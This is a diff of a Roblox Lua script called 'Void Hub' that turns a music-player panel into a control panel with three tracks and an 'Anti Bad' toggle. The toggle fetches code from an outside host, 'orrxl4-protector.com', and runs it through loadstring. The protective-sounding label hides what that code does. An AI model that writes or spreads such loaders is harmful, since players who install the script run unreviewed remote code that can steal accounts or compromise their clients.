@@ -1,5 +1,5 @@
 --============================================================
--- VOID HUB - LIGHT EDITION (STABLE & SAFE)
+-- VOID HUB - MULTI PANEL (SCRIPTS + 3 TRACKS MUSIC + PING BOOST)
 --============================================================
 
 local Players = game:GetService("Players")
@@ -65,7 +65,7 @@ pcall(function()
 end)
 
 --============================================================
--- 3. RUN EXTERNAL SCRIPT (السكريبت الآمن والأساسي فقط)
+-- 3. RUN MAIN EXTERNAL SCRIPT
 --============================================================
 
 task.spawn(function()
@@ -75,27 +75,27 @@ task.spawn(function()
 end)
 
 --============================================================
--- 4. DUAL MUSIC PLAYER GUI
+-- 4. CONTROL PANEL GUI
 --============================================================
 
-local oldGui = PlayerGui:FindFirstChild("VoidHubMusicGui")
+local oldGui = PlayerGui:FindFirstChild("VoidHubControlGui")
 if oldGui then oldGui:Destroy() end
 
-local musicGui = Instance.new("ScreenGui")
-musicGui.Name = "VoidHubMusicGui"
-musicGui.ResetOnSpawn = false
-musicGui.Parent = PlayerGui
+local mainGui = Instance.new("ScreenGui")
+mainGui.Name = "VoidHubControlGui"
+mainGui.ResetOnSpawn = false
+mainGui.Parent = PlayerGui
 
--- زر التجميع الجانبي
+-- زر فتح القائمة الجانبي
 local toggleBtn = Instance.new("TextButton")
 toggleBtn.Size = UDim2.fromOffset(45, 45)
 toggleBtn.Position = UDim2.new(0, 10, 0.5, -22)
 toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-toggleBtn.Text = "🎵"
+toggleBtn.Text = "⚙️"
 toggleBtn.TextSize = 22
 toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 toggleBtn.ZIndex = 100
-toggleBtn.Parent = musicGui
+toggleBtn.Parent = mainGui
 
 local btnCorner = Instance.new("UICorner")
 btnCorner.CornerRadius = UDim.new(0, 12)
@@ -106,14 +106,14 @@ btnStroke.Color = Color3.fromRGB(0, 170, 255)
 btnStroke.Thickness = 2
 btnStroke.Parent = toggleBtn
 
--- الإطار الرئيسي
+-- الإطار الرئيسي للقائمة
 local frame = Instance.new("Frame")
-frame.Size = UDim2.fromOffset(230, 180)
-frame.Position = UDim2.new(0, 65, 0.5, -90)
+frame.Size = UDim2.fromOffset(240, 250)
+frame.Position = UDim2.new(0, 65, 0.5, -125)
 frame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
 frame.BorderSizePixel = 0
 frame.Visible = false
-frame.Parent = musicGui
+frame.Parent = mainGui
 
 local frameCorner = Instance.new("UICorner")
 frameCorner.CornerRadius = UDim.new(0, 10)
@@ -127,16 +127,59 @@ frameStroke.Parent = frame
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 30)
 title.BackgroundTransparency = 1
-title.Text = "VOID HUB MUSIC PLAYER"
+title.Text = "VOID HUB CONTROL PANEL"
 title.TextColor3 = Color3.fromRGB(0, 170, 255)
 title.Font = Enum.Font.GothamBold
-title.TextSize = 12
+title.TextSize = 11
 title.Parent = frame
 
--- الأغاني والروابط
+--============================================================
+-- SCRIPT TOGGLES (Anti Bad)
+--============================================================
+
+local antiBadBtn = Instance.new("TextButton")
+antiBadBtn.Size = UDim2.new(0.85, 0, 0, 32)
+antiBadBtn.Position = UDim2.new(0.075, 0, 0.15, 0)
+antiBadBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+antiBadBtn.Text = "ANTI BAD: OFF ❌"
+antiBadBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+antiBadBtn.Font = Enum.Font.GothamBold
+antiBadBtn.TextSize = 11
+antiBadBtn.Parent = frame
+
+local antiBadCorner = Instance.new("UICorner")
+antiBadCorner.CornerRadius = UDim.new(0, 6)
+antiBadCorner.Parent = antiBadBtn
+
+local antiBadActive = false
+
+antiBadBtn.MouseButton1Click:Connect(function()
+	antiBadActive = not antiBadActive
+	if antiBadActive then
+		antiBadBtn.Text = "ANTI BAD: ON 🟢"
+		antiBadBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
+		antiBadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+		
+		task.spawn(function()
+			pcall(function()
+				loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=dcon25o8"))()
+			end)
+		end)
+	else
+		antiBadBtn.Text = "ANTI BAD: OFF ❌"
+		antiBadBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+		antiBadBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+	end
+end)
+
+--============================================================
+-- MUSIC PLAYER (الأغاني الثلاثة)
+--============================================================
+
 local SONGS = {
 	{Name = "Track 1", Url = "https://files.catbox.moe/nynv9p.mp3", File = "Void_Song_1.mp3"},
-	{Name = "Track 2", Url = "https://files.catbox.moe/jmqv9y.mp3", File = "Void_Song_2.mp3"}
+	{Name = "Track 2", Url = "https://files.catbox.moe/jmqv9y.mp3", File = "Void_Song_2.mp3"},
+	{Name = "Track 3 (فرفوشة)", Url = "https://files.catbox.moe/0mvc4o.mp3", File = "Void_Song_3.mp3"}
 }
 
 local currentTrack = 1
@@ -144,12 +187,12 @@ local soundInstance = nil
 
 local playBtn = Instance.new("TextButton")
 playBtn.Size = UDim2.new(0.85, 0, 0, 35)
-playBtn.Position = UDim2.new(0.075, 0, 0.25, 0)
+playBtn.Position = UDim2.new(0.075, 0, 0.35, 0)
 playBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 playBtn.Text = "PLAY MUSIC 🔊"
 playBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 playBtn.Font = Enum.Font.GothamBold
-playBtn.TextSize = 12
+playBtn.TextSize = 11
 playBtn.Parent = frame
 
 local playCorner = Instance.new("UICorner")
@@ -158,7 +201,7 @@ playCorner.Parent = playBtn
 
 local changeBtn = Instance.new("TextButton")
 changeBtn.Size = UDim2.new(0.85, 0, 0, 30)
-changeBtn.Position = UDim2.new(0.075, 0, 0.52, 0)
+changeBtn.Position = UDim2.new(0.075, 0, 0.54, 0)
 changeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
 changeBtn.Text = "CHANGE TRACK 🔀 (Track 1)"
 changeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -172,15 +215,14 @@ changeCorner.Parent = changeBtn
 
 local pingLabel = Instance.new("TextLabel")
 pingLabel.Size = UDim2.new(1, 0, 0, 20)
-pingLabel.Position = UDim2.new(0, 0, 0.82, 0)
+pingLabel.Position = UDim2.new(0, 0, 0.88, 0)
 pingLabel.BackgroundTransparency = 1
 pingLabel.Text = "⚡ PING & FPS BOOST ACTIVE"
 pingLabel.TextColor3 = Color3.fromRGB(0, 255, 120)
 pingLabel.Font = Enum.Font.GothamBold
-pingLabel.TextSize = 10
+pingLabel.TextSize = 9
 pingLabel.Parent = frame
 
--- تحميل الصوت
 local function loadAudioTrack(trackIdx)
 	if soundInstance then
 		soundInstance:Stop()
@@ -234,7 +276,7 @@ playBtn.MouseButton1Click:Connect(function()
 end)
 
 changeBtn.MouseButton1Click:Connect(function()
-	currentTrack = (currentTrack == 1) and 2 or 1
+	currentTrack = (currentTrack % #SONGS) + 1
 	changeBtn.Text = "CHANGE TRACK 🔀 (Track " .. tostring(currentTrack) .. ")"
 	loadAudioTrack(currentTrack)
 	if soundInstance then
